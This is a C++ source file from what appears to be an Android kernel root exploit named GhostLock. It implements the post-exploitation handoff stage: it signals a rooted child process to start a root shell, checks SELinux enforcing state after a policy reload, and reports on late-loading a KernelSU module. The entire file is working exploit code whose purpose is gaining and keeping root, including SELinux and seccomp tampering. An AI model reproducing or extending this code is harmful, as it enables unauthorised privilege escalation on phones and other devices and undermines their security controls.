/*
 * GhostLock — root_child frontend procedure (Batch 4, D1=B).
 *
 * The handoff step moved out of ExploitProcedure; the body is unchanged except
 * for using the ExploitSession parameter instead of the procedure's member.
 */

#include "session/root_child_frontend.hpp"

#include "attack/ops.hpp"
#include "route/route_api.hpp"
#include "session/handoff_probe.hpp"

#include <unistd.h>

#include <cerrno>
#include <cstdint>

namespace ghostlock::session::frontend {
    /* Stage: settle, root-shell handoff and KernelSU late-load. */
    StageResult run_root_child_handoff(ExploitSession &session, const VictimChain &chain) {
        const int32_t child_alive = chain.child_alive;
        const int32_t seccomp_ok = chain.seccomp_ok;
        const int32_t ever_rooted = chain.ever_rooted;
        /* SESSION-02: the victim protocol pipes and parked handoff state are owned
         * by the session; the child pid is owned by the victim context. */
        victim::VictimContext &pipes = session.victim;
        const pid_t child = pipes.child();
        pid_t &parked_child = session.parked_victim;
        support::UniqueFd &parked_cmd_w = session.parked_victim_cmd;

        /* Let the repaired credential and reclaimed waiter state settle before the
         * rooted child reloads SELinux policy and late-loads KernelSU.  Dispatching
         * immediately regressed the proven 5.15 path: KernelSU loaded, then init
         * exited during policy recovery and the device panicked. */
        usleep(session::g_exploit_session.profile.handoff_pre_dispatch_settle_ms() * 1000U);
        attack::timer_mark("exploit complete");
        if (!ever_rooted) {
            pr_error("w2 never rooted a child\n");
            return StageResult::Failed;
        }
        if (child_alive) {
            errno = 0;
            const ssize_t sent = write(pipes.cmd_write.get(), "G", 1);
            pr_info("handoff: child=%d alive=%d sent=%zd errno=%d\n", child,
                    child_alive, sent, errno);
            if (sent != 1)
                pr_warning("failed to start root shell (child exited early)\n");
            pipes.cmd_write.reset();
            waitpid(child, nullptr, WNOHANG);
            (void) pipes.release_child();
            parked_cmd_w.reset();
        } else if (parked_child > 0) {
            if (write(parked_cmd_w.get(), "G", 1) != 1)
                pr_warning("failed to start root shell (parked child exited)\n");
            parked_cmd_w.reset();
            waitpid(parked_child, nullptr, WNOHANG);
        } else {
            pr_warning("skipping late-load: child died during W3\n");
        }
        pipes.uid_read.reset();

        HandoffPollPolicy handoff_policy;
        handoff_policy.module_poll_attempts =
                session::g_exploit_session.profile.handoff_module_poll_attempts();
        handoff_policy.module_poll_interval_ms =
                session::g_exploit_session.profile.handoff_module_poll_interval_ms();
        handoff_policy.enforce_poll_attempts =
                session::g_exploit_session.profile.handoff_enforce_poll_attempts();
        handoff_policy.enforce_poll_interval_ms =
                session::g_exploit_session.profile.handoff_enforce_poll_interval_ms();
        const HandoffProbeResult handoff_result =
                handoff_probe_run(handoff_policy, config::runtime_config_snapshot().ksu_log_path);
        if (handoff_result.enforce_ok)
            pr_info("enforce=1 (enforcing)\n");
        else if (handoff_result.ksu_log_loaded)
            pr_warning("enforce=0 (still permissive)\n");
        const int32_t kernelsu_ready = handoff_result.ready() ? 1 : 0;

        /* Fixup: permissive, load_policy, late-load. Module init re-enforces;
         * policy reload keeps it working after enforcing is back. */
        if (kernelsu_ready)
            pr_success("KernelSU ready\n");
        else if (handoff_result.ksu_log_failed)
            pr_warning("KernelSU module load failed\n");
        else if (seccomp_ok)
            pr_warning("temporary root ready; KernelSU module load pending\n");
        else
            pr_warning("temporary root ready; KernelSU module not loaded (W3 seccomp clear failed)\n");
        route::kernel5_resident_stop();
        return StageResult::Done;
    }
} // namespace ghostlock::session::frontend
